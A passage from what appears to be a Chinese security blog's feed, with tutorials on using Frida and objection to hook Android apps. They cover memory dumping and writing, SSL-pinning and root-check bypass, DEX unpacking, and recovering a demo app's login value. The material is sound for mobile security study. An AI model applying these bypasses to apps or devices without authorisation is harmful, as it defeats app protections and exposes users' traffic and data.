cat = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.injectiondex.Cat&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> oneCat = cat.$new();</span><br><span class="line">    <span class="keyword">var</span> catsay = oneCat.<span class="title function_">say</span>();</span><br><span class="line">    <span class="keyword">var</span> cateat = oneCat.<span class="title function_">eat</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> innerClazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.fridademo.Calc$InnerClass&quot;</span>);</span><br><span class="line">    innerClazz.<span class="property">print</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> catsay+cateat;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407141824157.gif" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida </tag>
            
            <tag> Hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>objection工具使用</title>
      <link href="/2024/07/10/objection%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
      <url>/2024/07/10/objection%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>下载地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sensepost/objection/releases</span><br></pre></td></tr></table></figure><p>现在最新版的<code>objection</code>为1.11.0</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101056146.png" alt="image-20240710105651985"> </p><p><code>objection</code>是通过<code>Frida</code>来提供服务的，所以安装<code>objection</code>之前要先安装<code>frida</code>。</p><hr><p>按照推荐版本来做：（<strong>这块Python版本使用3.7的，不然后面肯会报错</strong>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida 12.8.0</span><br><span class="line">frida-tools  5.3.0</span><br><span class="line">objection  1.8.4</span><br><span class="line">jnitrace  3.0.8</span><br></pre></td></tr></table></figure><p>想要使用基于frida版本的objection，只需要安装好特定版本的frida和frida-tools，再去objection的releases里面找那个日期之前一点点的版本即可，比如以frida 12.8.0 版本为例：</p><p>1、首先安装特定版本的 frida</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip  install frida==12.8.0</span><br><span class="line">pip  install  frida-tools==5.3.0</span><br></pre></td></tr></table></figure><p>2、然后，安装objection</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip  install  objection==1.8.4</span><br></pre></td></tr></table></figure><p>3、frida配置到手机</p><p>查看Android手机设备设置   <strong>getprop   ro.product.cpu.abi</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101101628.png" alt="img"> </p><p>据cpu版本去下载相应<a href="https://links.jianshu.com/go?to=https://github.com/frida/frida/releases">frida-server</a>,手机是x86_64的，找到相应的服务器server,如下</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101101977.png" alt="image.png"> </p><p>将frida-server下载下来，解压出来，为了简单，重命名为将frida-server下载下来，加压出来，为了简单，重命名为frida-server64，将放到手机，并进行端口转发，运行frida，将放到手机，并进行端口转发，运行frida</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\frida</span><br><span class="line">λ adb push frida-serverx86 /data/local/tmp</span><br><span class="line">frida-serverx86: 1 file pushed. 6.7 MB/s (28209380 bytes in 3.992s)</span><br><span class="line"></span><br><span class="line">E:\frida</span><br><span class="line">λ adb shell</span><br><span class="line">root@aosp:/ # cd /</span><br><span class="line">root@aosp:/ # cd data/local/tmp/</span><br><span class="line">root@aosp:/data/local/tmp # chmod 777 frida-serverx86</span><br><span class="line">root@aosp:/data/local/tmp # ./frida-serverx86</span><br><span class="line">WARNING: linker: ./frida-serverx86: unused DT entry: type 0x6ffffef5 arg 0x1c60</span><br></pre></td></tr></table></figure><p>运行 <strong>frida-ps -U</strong> 查看是否正常运行</p><p>4、排错</p><p>这块安装好后，直接运行frida或者objection会报错，原因如下：</p><p><a href="https://blog.csdn.net/weixin_43205308/article/details/130830307">解决python urllib3 v2.0 only supports OpenSSL 1.1.1+, currently-CSDN博客</a></p><p><a href="https://blog.csdn.net/guo343310267/article/details/88343025">windows安装frida运行环境_failed to load the frida native extension-CSDN博客</a></p><p>5、安装成功</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101102643.png" alt="image.png"> </p><p>【注意】有的APP应用可能会对frida默认的端口做检测，这里可以选用一个不常用的端口，如7777</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frida-server  -l 0.0.0.0:7777</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101103143.png" alt="image.png"> </p><h1 id="0x02-objection命令详解"><a href="#0x02-objection命令详解" class="headerlink" title="0x02  objection命令详解"></a>0x02  objection命令详解</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection -g com.zj.wuaipojie -d explore   //objection连接到要附加的APP进程</span><br><span class="line">-g:后面跟包名</span><br><span class="line">-d:输出调试信息</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105072.png" alt="image.png"> </p><p>输入 “空格” 可以发现里面内置的一些命令，如frida、env等</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105873.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101105141.png" alt="image.png"> </p><p>import  xxx.js  &#x2F;&#x2F;导入frida的脚本</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101106897.png" alt="image.png"> </p><h2 id="memory模块"><a href="#memory模块" class="headerlink" title="memory模块"></a>memory模块</h2><h3 id="列出内存中加载的库"><a href="#列出内存中加载的库" class="headerlink" title="列出内存中加载的库"></a>列出内存中加载的库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory list modules  //列出内存中加载的库</span><br><span class="line"></span><br><span class="line">如果要把结果以json格式输出到本地可以在指令后添加参数：</span><br><span class="line">memory list modules --json /root/modules.json</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101110308.png" alt="image.png"> </p><h3 id="列出某个库的导出函数"><a href="#列出某个库的导出函数" class="headerlink" title="列出某个库的导出函数"></a>列出某个库的导出函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory list exports  xxx   //列出某个库的导出函数</span><br><span class="line"></span><br><span class="line">memory list exports &quot;libbinder.so&quot;   //这块列出 libbinder.so 文件的导出函数</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101111758.png" alt="image.png"> </p><h3 id="提取内存数据"><a href="#提取内存数据" class="headerlink" title="提取内存数据"></a>提取内存数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">提取内存数据</span><br><span class="line">memory dump from_base 0x12fc9c78 9 /root/memory.txt</span><br><span class="line">//从内存中提取其地址为 0x12fc9c78 长度为 9bit 的数据</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101113370.jpeg" alt="img"> </p><h3 id="搜索内存数据"><a href="#搜索内存数据" class="headerlink" title="搜索内存数据"></a>搜索内存数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索内存数据</span><br><span class="line">想找到“aaaqqq”运行</span><br><span class="line">memory search &quot;61 61 61 71 71 71&quot;</span><br><span class="line">或者模糊搜索</span><br><span class="line">memory search &quot;61 61 61 71&quot;、memory search &quot;61 61 61 ?? ?? 71&quot;。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114408.jpeg" alt="img"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以增加参数通过字符串搜索，运行memory search &quot;aaaqqq&quot; --string，此方式不支持模糊搜索</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114255.jpeg" alt="img"> </p><h3 id="写入内存数据"><a href="#写入内存数据" class="headerlink" title="写入内存数据"></a>写入内存数据</h3><p>通过内存地址可以写入数据，比如搜索TextView的文字“Helloword”并通过memory write 0x12fc9c78 ‘61 61 61’修改其中一处结果，再把进程切换一下后台&amp;前台，就刷新成修改的数据了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">memory write 0x12fc9c78 &#x27;61 61 61&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101114112.gif" alt="img"> </p><h2 id="Android模块（常用）"><a href="#Android模块（常用）" class="headerlink" title="Android模块（常用）"></a>Android模块（常用）</h2><h3 id="列出内存中加载的所有类"><a href="#列出内存中加载的所有类" class="headerlink" title="列出内存中加载的所有类"></a>列出内存中加载的所有类</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101117083.png" alt="image.png"> </p><h3 id="列出指定类的所有方法"><a href="#列出指定类的所有方法" class="headerlink" title="列出指定类的所有方法"></a>列出指定类的所有方法</h3><p>假设要查看APP MainActivity 类的方法，运行android hooking list class_methods com.zyc.objectiondemo.MainActivity，可以看到只打印了属于该类的方法，继承来的并不会打印。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking class com.zyc.objectiondemo.MainActivity</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101122483.jpeg" alt="img"> </p><h3 id="在内存中所有的类里搜索类"><a href="#在内存中所有的类里搜索类" class="headerlink" title="在内存中所有的类里搜索类"></a>在内存中所有的类里搜索类</h3><p>从已加载的类里查找和“zyc”关键字，运行android hooking search classes zyc。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search classes zyc</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101128321.jpeg" alt="img"> </p><h3 id="在所有类中搜索指定方法"><a href="#在所有类中搜索指定方法" class="headerlink" title="在所有类中搜索指定方法"></a>在所有类中搜索指定方法</h3><p>假设要搜索带“onCreate”的方法，运行android hooking search methods onCreate。该指令会遍历内存中所有已加载类的所有方法执行搜索，数据量非常大，过程相当耗时，甚至容易卡死和崩溃，所以会在运行前手动输入“y”同意</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search methods onCreate</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101129196.jpeg" alt="img"> </p><h3 id="列出所有Activity、Service、Receiver"><a href="#列出所有Activity、Service、Receiver" class="headerlink" title="列出所有Activity、Service、Receiver"></a>列出所有Activity、Service、Receiver</h3><p>查看APP的组件使用如下命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking list activities</span><br><span class="line">android hooking list services</span><br><span class="line">android hooking list receivers</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101333830.jpeg" alt="img"> </p><p>（1）启动<code>activity</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android intent launch_activity com.md.obj.ui.PlayerActivity</span><br></pre></td></tr></table></figure><p>（2）启动<code>services</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android intent launch_service [services_class]  </span><br></pre></td></tr></table></figure><h3 id="内存堆上搜索实例"><a href="#内存堆上搜索实例" class="headerlink" title="内存堆上搜索实例"></a>内存堆上搜索实例</h3><p>从用例代码可知，运行APP进入 MainActivity 后会创建3个Car对象，此时如果想查看内存中的Car实例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android heap search instances com.zyc.objectiondemo.Car</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101338985.jpeg" alt="img"> </p><h3 id="调用实例的方法"><a href="#调用实例的方法" class="headerlink" title="调用实例的方法"></a>调用实例的方法</h3><p>搜索到实例获取地址后可调用其方法。如果要调用实例1的 <strong>show()</strong> 方法，运行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android heap execute 68389604 show</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101339473.jpeg" alt="img"> </p><h3 id="实时注入实例"><a href="#实时注入实例" class="headerlink" title="实时注入实例"></a>实时注入实例</h3><p>拿到实例后可以直接在实例上书写js注入，运行</p><p>android heap evaluate 23973990 会进入js编辑器，可以实时编写、注入、调试，但没有代码提示。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101358116.jpeg" alt="img"> </p><h3 id="导入hook代码"><a href="#导入hook代码" class="headerlink" title="导入hook代码"></a>导入hook代码</h3><p>objection支持导入Hook js文件使用，比如 &#x2F;root&#x2F;Desktop&#x2F;objectionHook.js 有下面Hook代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook start...&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Car</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zyc.objectiondemo.Car&quot;</span>);</span><br><span class="line">        <span class="title class_">Car</span>.<span class="property">show</span>.<span class="title function_">overload</span>(<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg1</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook show...&quot;</span> + arg1);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">show</span>(arg1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(<span class="title function_">main</span>())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行import &#x2F;root&#x2F;Desktop&#x2F;objectionHook.js就可以在objection中直接使用了。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101359725.gif" alt="img"> </p><h3 id="hook一个类中的所有方法"><a href="#hook一个类中的所有方法" class="headerlink" title="hook一个类中的所有方法"></a>hook一个类中的所有方法</h3><p>运行android hooking watch class com.zyc.objectiondemo.Car可以Hook到Car类下所有方法（不包括构造方法）的调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class com.zyc.objectiondemo.Car</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101407098.gif" alt="img"> </p><h3 id="hook一个类中的单个方法"><a href="#hook一个类中的单个方法" class="headerlink" title="hook一个类中的单个方法"></a>hook一个类中的单个方法</h3><p>如果只需要Hook单个方法（包括其重载），比如上面没有Hook到的Car类构造函数，可以运行：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.$init。</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101407323.gif" alt="img"> </p><p>如果不需要Hook方法的重载，可以在方法名后面加上参数类型:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.$init &quot;int,java.lang.String&quot;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101408286.gif" alt="img"> </p><p>指令末尾加上对应选项可以<strong>展示参数、返回值和调用栈</strong>，运行:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method com.zyc.objectiondemo.Car.show --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101408751.gif" alt="img"> </p><h3 id="关闭SSLPinning检测"><a href="#关闭SSLPinning检测" class="headerlink" title="关闭SSLPinning检测"></a>关闭SSLPinning检测</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101409638.png" alt="image.png"> </p><h3 id="关闭app的root校验"><a href="#关闭app的root校验" class="headerlink" title="关闭app的root校验"></a>关闭app的root校验</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android root disable        </span><br></pre></td></tr></table></figure><h3 id="尝试模拟root环境"><a href="#尝试模拟root环境" class="headerlink" title="尝试模拟root环境"></a>尝试模拟root环境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android root simulate</span><br></pre></td></tr></table></figure><h2 id="系统任务jobs"><a href="#系统任务jobs" class="headerlink" title="系统任务jobs"></a>系统任务jobs</h2><p>objection可以同时运行多项任务，比如下图创建Hook任务时打印了任务id 629342，通过指令jobs list能查看当前运作的任务。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs list</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101411380.jpeg" alt="img"> </p><p>可以通过id结束某项任务，运行jobs kill 629342。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jobs kill 629342</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101411103.jpeg" alt="img"> </p><h1 id="0x03-objection批量trace"><a href="#0x03-objection批量trace" class="headerlink" title="0x03 objection批量trace"></a>0x03 objection批量trace</h1><p>要实现对APP中的所有类进行hook，需要怎么做呢？？？</p><p>1、先查找APP中的所有类</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">android hooking search classes com.zj.wuaipojie</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101418481.png" alt="image.png"> </p><p>2、将这8个类复制下来，放到txt中</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419352.png" alt="image.png"> </p><p>3、给这些类前面批量添加字符串 “android hooking watch class”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419369.png" alt="image.png"> </p><p>4、使用命令对所有类进行hook</p><p>在刚开始附加进程的时候，使用参数 -c</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objection -g com.zj.wuaipojie -d explore -c 1.txt</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101419683.png" alt="image.png"> </p><h1 id="0x04-Wallbreaker插件"><a href="#0x04-Wallbreaker插件" class="headerlink" title="0x04 Wallbreaker插件"></a>0x04 Wallbreaker插件</h1><p><a href="https://github.com/hluwa/Wallbreaker">Wallbreaker</a>是一个实时分析 Java 堆的有用工具，由frida提供支持。提供一些命令从内存中搜索对象或类，并精美地可视化目标的真实结构。</p><p>1、下载安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.objection/plugins/</span><br><span class="line">git clone https://github.com/hluwa/Wallbreaker ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p>2、加载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 第一种方法：</span><br><span class="line">objection -g com.example.androiddemo explore  -P ~/.objection/plugins</span><br><span class="line"># 第二种方法：</span><br><span class="line">objection -g com.example.androiddemo explore</span><br><span class="line">plugin load ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p>3、命令使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索类</span><br><span class="line">plugin wallbreaker objectsearch LoginActivity</span><br><span class="line">//返回：</span><br><span class="line">com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">com.example.androiddemo.Activity.LoginActivity$1</span><br><span class="line"> </span><br><span class="line"># 根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果 --fullname 打印完整的包名</span><br><span class="line">plugin wallbreaker classdump com.example.androiddemo.Activity.LoginActivity --fullname</span><br><span class="line"> </span><br><span class="line"># 搜索对象</span><br><span class="line">plugin wallbreaker objectsearch com.example.androiddemo.Activity.LoginActivity</span><br><span class="line">//返回：</span><br><span class="line">[0x2262]: com.example.androiddemo.Activity.LoginActivity@d8a5160</span><br><span class="line"> </span><br><span class="line"># 查看对象的一些属性和方法</span><br><span class="line">plugin wallbreaker objectdump 0x2262 --fullname</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101422586.png" alt="img"> </p><h1 id="0x05-FRIDA-DEXDump-脱壳插件"><a href="#0x05-FRIDA-DEXDump-脱壳插件" class="headerlink" title="0x05 FRIDA-DEXDump 脱壳插件"></a>0x05 FRIDA-DEXDump 脱壳插件</h1><p><a href="https://github.com/hluwa/FRIDA-DEXDump">frida-dexdump</a> ：快速的从内存中搜索和转存DEX</p><p>1、安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hluwa/FRIDA-DEXDump ~/.objection/plugins/dexdump</span><br></pre></td></tr></table></figure><p>2、启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin dexdump dump</span><br></pre></td></tr></table></figure><p>3、返回值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEXDump]: DexSize=0x1d1f50, DexMd5=7ed584af40ef0b1bc211688395e92c98,SavePath=/root/.objection/plugins/com.example.androidemo/0x7e38c0201c.de</span><br></pre></td></tr></table></figure><h1 id="0x06-watch-events-插件"><a href="#0x06-watch-events-插件" class="headerlink" title="0x06 watch_events 插件"></a>0x06 watch_events 插件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hluwa/objection-plugins ~/.objection/plugins  --recurse-submodules</span><br><span class="line"> </span><br><span class="line">objection -g com.app.name explore -P ~/.objection/plugins</span><br><span class="line"> </span><br><span class="line">这里安装成功后，也会自动加载 wallbreaker 、dexdump</span><br></pre></td></tr></table></figure><p>开启后，点击屏幕按钮，比如这里我提交了登录按钮，打印出来它的类，实现了快速定位。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plugin watch_event onclick</span><br><span class="line"> </span><br><span class="line">com.example.androiddemo on (google: 8.1.0) [usb] # (agent) [WatchEvent] onClick: </span><br><span class="line">com.example.androiddemo.Activity.LoginActivity$1</span><br></pre></td></tr></table></figure><h1 id="0x07-objection实战分析加密参数"><a href="#0x07-objection实战分析加密参数" class="headerlink" title="0x07 objection实战分析加密参数"></a>0x07 objection实战分析加密参数</h1><p>1、目标</p><p>此次演示的APP是一个通过测试的APP，这里我们就不写一行代码，也不用反编译工具分析代码，全程用objection来分析。通关第一关登录。</p><p>2、分析</p><p>此次分析的目的找到当前登录页面的类。android hooking list activities</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431946.png" alt="img"> </p><p>3、hook这个类</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431240.png" alt="img"> </p><p>4、提交按钮,得到返回值：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407101431745.png" alt="img"> </p><p>5.将得到返回值 </p><p>2f02e24ae2e1fe880399f27600afa88364e6062bf9bbe114b32fa8f23d03608a 输入密码框中提交代码，发现成功通过第一关。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell input text &#x27;2f02e24ae2e1fe880399f27600afa88364e6062bf9bbe114b32fa8f23d03608a&#x27;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初始Frida</title>
      <link href="/2024/07/09/%E5%88%9D%E5%A7%8Bfrida/"/>
      <url>/2024/07/09/%E5%88%9D%E5%A7%8Bfrida/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-Frida安装-环境"><a href="#0x01-Frida安装-环境" class="headerlink" title="0x01 Frida安装&amp;环境"></a>0x01 Frida安装&amp;环境</h1><h2 id="Frida安装"><a href="#Frida安装" class="headerlink" title="Frida安装"></a>Frida安装</h2><p>可以参考<code>objection</code>使用那节，里面有提到Frida的安装。</p><h2 id="Frida代码编写环境"><a href="#Frida代码编写环境" class="headerlink" title="Frida代码编写环境"></a>Frida代码编写环境</h2><p>在系统里装上这个npm包，可以在任意工程中获得frida的代码提示、补全和API查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i -g @type/frida-gum</span><br></pre></td></tr></table></figure><p>新建一个文件测试，发现就可以成功查看提示、补全等操作了:</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407121048560.png" alt="image.png"> </p><h2 id="Frida常用命令"><a href="#Frida常用命令" class="headerlink" title="Frida常用命令"></a>Frida常用命令</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407121048532.png" alt="image.png"> </p><p><strong>1、查看版本</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure><p><strong>2、查看安卓进程pid</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p><strong>3、端口转发</strong></p><p>1） 第一个tcp:电脑端口</p><p>2）第二个tcp:手机端口</p><p>将PC端的27042端口收到的数据，转发给到手机中27042端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><p><strong>4、注入JS脚本</strong></p><p>1）  -U 后(包名|进程pid| -F 注入最前端的APP)</p><p>2） -l 后(文件路径)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U com.android.xxx -l D:\NodeProjects\Demo\Hook.js</span><br></pre></td></tr></table></figure><p><strong>5、hook启动前app</strong></p><p>1） -U -f 后(包名）</p><p>2）-l 后(文件路径)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.xxx.xxx -l D:\NodeProjects\Demo\Hook.js --no-pause</span><br></pre></td></tr></table></figure><p><strong>6、APP挂起的方式创建进程</strong></p><p>1）-U -f 后(包名)</p><p> 2） -l 后(文件路径)</p><p>提示 Spawned <code>com.xiaojianbang.app</code>. Use %resume to let the main thread start executing!</p><p>就可以执行注入等等,%resume 恢复进程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frida -U -f com.xxx.xxx -l D:\NodeProjects\Demo\Hook.js</span><br></pre></td></tr></table></figure><p><strong>7、恢复挂起的进程</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%resume</span><br></pre></td></tr></table></figure><h1 id="0x02-Frida常用API"><a href="#0x02-Frida常用API" class="headerlink" title="0x02 Frida常用API"></a>0x02 Frida常用API</h1><h2 id="1-Frida访问方法及变量"><a href="#1-Frida访问方法及变量" class="headerlink" title="1. Frida访问方法及变量"></a>1. Frida访问方法及变量</h2><ul><li>方法调用<ul><li>静态方法使用<code>Java.use</code>获得<strong>类</strong>后直接调用</li><li>非静态方法需要使用<code>Java.choose</code>查找到<strong>类实例</strong>后进行调用</li><li>构造方法为<code>$init</code></li><li>对于内部类，通过<code>类名$内部类名</code>去use或者choose</li></ul></li><li>静态&#x2F;非静态变量<ul><li>设置成员变量的值，写法是<code>[field_name].value = [value]</code>，其他方面和函数一样。</li><li>如果有一个成员变量和成员函数的名字相同，则在其前面加一个<code>_</code>，如<code>_[field_name].value = [value]</code></li></ul></li></ul><h3 id="静态方法调用Java-use"><a href="#静态方法调用Java-use" class="headerlink" title="静态方法调用Java.use"></a>静态方法调用Java.use</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="comment">// 先查找HookedObject类，然后hook其的stringTwo方法</span></span><br><span class="line">            <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.forgotten.fridatestapp.HookedObject&quot;</span>).<span class="property">stringTwo</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg</span>) &#123;</span><br><span class="line">              <span class="comment">// this为当前实例，获得原方法执行的结果</span></span><br><span class="line">              <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">stringTwo</span>(arg);</span><br><span class="line">              <span class="comment">// 打印参数和原方法结果</span></span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;stringTwo arg,result: &quot;</span>, arg, result);</span><br><span class="line">              <span class="comment">// 